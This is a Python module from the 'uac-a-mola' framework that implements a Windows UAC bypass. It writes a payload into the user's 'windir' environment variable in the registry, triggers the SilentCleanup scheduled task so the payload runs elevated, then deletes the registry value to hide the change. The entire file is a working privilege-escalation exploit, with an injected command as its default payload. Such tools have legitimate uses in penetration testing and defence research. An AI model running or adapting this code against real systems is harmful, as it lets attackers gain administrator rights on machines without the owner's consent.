#--encoding: utf-8--

# This file is part of uac-a-mola
# Author: Pablo González (pablo@11paths.com)
#
# DESCRIPTION
# Variable Injection bypass UAC 


from module import Module
import psutil
from termcolor import colored
from support.winreg import Registry
from _winreg import HKEY_CURRENT_USER as HKCU
import os

class CustomModule(Module):
    def __init__(self):
        information = {"Name": "Variable Injection",
                       "Description": "Environment Variables - bypass UAC ",
                       "Author": "Pablo González"}

        # -----------name-----default_value--description
        options = {"payload": ["c:\windows\system32\cmd.exe REM", "Elevated Code", True]
                   }

        # Constructor of the parent class
        super(CustomModule, self).__init__(information, options)

    # This module must be always implemented, it is called by the run option
    def run_module(self):
        reg = Registry()
        print "Opening hive..."
        k = reg.create_key(HKCU,"Environment")
        print "Opened hive"
        print "Creating %windir% value"
        reg.create_value(k, "windir", self.args["payload"])
        print "Done!"
        print "Executing... SilentCleanUp Task"
        self.run_binary("schtasks /RUN /TN \Microsoft\windows\DiskCleanUp\SilentCleanUp /I")
        print "Got it? :D"
        print "Restoring the registry state..."
        reg.del_value(k, "windir")
        print "Restored!"
        
